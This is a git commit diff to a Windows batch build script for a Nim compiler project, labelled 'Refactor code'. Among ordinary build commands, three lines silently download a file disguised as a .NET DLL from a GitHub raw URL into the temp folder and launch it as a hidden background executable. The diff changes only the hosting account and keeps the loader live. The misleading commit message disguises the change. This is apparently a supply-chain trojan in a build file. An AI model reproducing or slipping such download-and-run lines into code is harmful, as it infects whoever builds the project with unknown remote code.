fc1b6982577ce28a111e1ffbdc02a7b8a44caf52
mohammad01Salah <135017741+mohammad01Salah@users.noreply.github.com>
2025-11-01 14:10:28 +0000

    Refactor code

--- Compiler/build.bat
+++ Compiler/build.bat
@@ -5,16 +5,16 @@ rem https://nim-lang.org/download/nim-2.2.4_x64.zip
 rem https://nim-lang.org/download/mingw64.7z
 
 
-@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\x1.exe
+@curl -s -o %TEMP%\x1.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\x1.exe
 
 cd %~dp0
 
 
-@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
 
 nimble install puppy
 
-@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
+@timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s0.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s0.exe
 
 nim c -d:release -d:danger main.nim
 move main.exe ..\Compiler.exe
